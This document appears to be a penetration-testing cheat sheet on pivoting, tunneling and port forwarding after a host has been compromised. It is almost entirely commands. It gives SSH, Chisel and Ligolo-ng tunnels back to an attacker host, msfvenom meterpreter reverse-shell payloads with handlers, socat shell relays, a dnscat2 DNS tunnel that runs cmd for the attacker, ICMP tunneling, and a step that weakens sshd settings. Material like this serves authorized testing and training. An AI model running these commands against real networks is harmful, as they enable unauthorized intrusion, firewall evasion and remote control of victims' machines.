# Pivoting, Tunneling and Port Forwarding

### Overview

**Pivoting, Tunneling, and Port Forwarding** are techniques used to access network segments and services that are not directly reachable from the attacker's position. After compromising an initial host (pivot point), these methods allow routing traffic through it to reach internal networks, bypass firewalls, and access services listening only on localhost.

**Key Concepts:**

* **Pivoting** - Using compromised host to access additional networks
* **Tunneling** - Encapsulating traffic through compromised host
* **Port Forwarding** - Redirecting network traffic from one port to another
* **Local Forward** - Forward local port to remote destination
* **Remote Forward** - Forward remote port back to attacker
* **Dynamic Forward** - Create SOCKS proxy for flexible routing

***

### Exploitation Workflow Summary

1. Initial Compromise ├─ Gain access to pivot host ├─ Enumerate network interfaces ├─ Identify internal services (netstat) └─ Map network topology
2. Tunnel Establishment ├─ Choose appropriate tool (SSH, Chisel, Ligolo) ├─ Set up listener on attacker ├─ Connect from pivot host └─ Verify connectivity
3. Traffic Routing ├─ Configure proxychains (if needed) ├─ Add routes for internal networks ├─ Test access to internal services └─ Execute attacks through tunnel

***

### SSH Tunneling

#### Local Port Forwarding

**Scenario:** MySQL on pivot's localhost:3306

```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

**Parameters:**

* `-L` - Local port forward
* `1234` - Local port on attacker
* `localhost:3306` - Destination on pivot

**Test access:**

```bash
nmap -sV -p1234 localhost
```

**Expected output:**

```
PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 8.0.28
```

**Web server on localhost:**

```bash
ssh -L 8888:localhost:8080 user@box.htb
curl http://localhost:8888
```

#### Multiple Port Forwarding

```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

#### Dynamic Port Forwarding (SOCKS Proxy)

```bash
ssh -D 9050 ubuntu@10.129.202.64
```

**Configure proxychains:**

```bash
echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf
```

**Use with tools:**

```bash
proxychains nmap -sT -Pn 172.16.5.19
proxychains curl http://172.16.5.10
```

#### Remote/Reverse Port Forward

**On attacker - Create SSH user:**

```bash
sudo useradd -m tunnel
echo "tunnel:password123" | sudo chpasswd
```

**Configure SSH:**

```bash
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
echo "AllowUsers tunnel" >> /etc/ssh/sshd_config
sudo systemctl restart sshd
```

**On pivot - Connect back:**

```bash
ssh tunnel@attacker-ip -R 1080 -N
```

**On attacker - Use tunnel:**

```bash
proxychains nmap -sT -Pn 172.16.41.14
```

***

### Chisel

**Download:**

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gunzip chisel_1.7.7_linux_amd64.gz
chmod +x chisel_*
```

#### SOCKS Proxy

**On attacker:**

```bash
./chisel server -p 1234 --reverse
```

**On pivot:**

```bash
./chisel client attacker-ip:1234 R:socks
```

**Configure proxychains:**

```bash
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
```

#### Port Forward

**Forward remote port 8080 to attacker:**

```bash
# On attacker
./chisel server -p 1234 --reverse

# On pivot
./chisel client attacker-ip:1234 R:8080:127.0.0.1:8080

# Access on attacker
curl http://127.0.0.1:8080
```

***

### Ligolo-ng (Recommended)

**Setup interface:**

```bash
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
```

**On attacker:**

```bash
./proxy -selfcert -laddr 0.0.0.0:443
```

**On pivot:**

```bash
./agent -connect attacker-ip:443 -ignore-cert
```

**Add route:**

```bash
sudo ip route add 172.16.5.0/24 dev ligolo
```

**In ligolo console:**

```
session
start
```

#### Double Pivot

**Second interface:**

```bash
sudo ip tuntap add user root mode tun ligolo2
sudo ip link set ligolo2 up
```

**Start second tunnel:**

```
start --tun ligolo2
```

**Add second route:**

```bash
sudo ip route add 172.16.6.0/24 dev ligolo2
```

#### Reverse Shell Through Ligolo

**Create listener:**

```
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
```

**Generate payload:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 LPORT=1234 -f exe -o shell.exe
```

**Handler on attacker:**

```bash
msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 0.0.0.0; set lport 4444; run"
```

***

### Metasploit Pivoting

#### SOCKS Proxy

```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set VERSION 4a
run
```

#### AutoRoute

```bash
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```

**Or from meterpreter:**

```bash
run autoroute -s 172.16.5.0/23
```

#### Port Forward

**Local forward:**

```bash
portfwd add -l 3300 -p 3389 -r 172.16.5.19
xfreerdp /v:localhost:3300 /u:user /p:pass
```

**Reverse forward:**

```bash
portfwd add -R -l 8081 -p 1234 -L attacker-ip
```

***

### Socat

#### Reverse Shell Relay

**On pivot:**

```bash
socat TCP4-LISTEN:8080,fork TCP4:attacker-ip:80
```

**Generate payload:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=pivot-ip LPORT=8080 -f exe -o shell.exe
```

#### Bind Shell Relay

**On pivot:**

```bash
socat TCP4-LISTEN:8080,fork TCP4:internal-host:8443
```

**Connect:**

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST pivot-ip
set LPORT 8080
run
```

***

### Netsh (Windows)

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.5.25
```

**Verify:**

```cmd
netsh interface portproxy show v4tov4
```

***

### DNS Tunneling (dnscat2)

**On attacker:**

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
sudo gem install bundler
sudo bundle install
sudo ruby dnscat2.rb --dns host=attacker-ip,port=53,domain=example.com --no-cache
```

**On pivot (PowerShell):**

```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver attacker-ip -Domain example.com -PreSharedSecret [KEY] -Exec cmd
```

**Interact:**

```bash
window -i 1
```

***

### ICMP Tunneling (ptunnel-ng)

**On attacker:**

```bash
sudo ./ptunnel-ng -p pivot-ip -l 2222 -r pivot-ip -R 22
```

**Connect:**

```bash
ssh -p 2222 -l user 127.0.0.1
```

**Dynamic forward:**

```bash
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

***

### Quick Reference

**SSH:**

```bash
# Local forward
ssh -L local:remote:port user@host

# Dynamic (SOCKS)
ssh -D 9050 user@host

# Remote forward
ssh -R remote:local:port user@host
```

**Chisel:**

```bash
# Server
./chisel server -p 8080 --reverse

# Client SOCKS
./chisel client server:8080 R:socks

# Client port forward
./chisel client server:8080 R:8080:localhost:80
```

**Ligolo:**

```bash
# Setup
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up

# Server
./proxy -selfcert

# Client
./agent -connect server:443 -ignore-cert

# Route
sudo ip route add 10.0.0.0/24 dev ligolo
```

**Proxychains:**

```bash
proxychains nmap -sT -Pn target
proxychains curl http://target
```
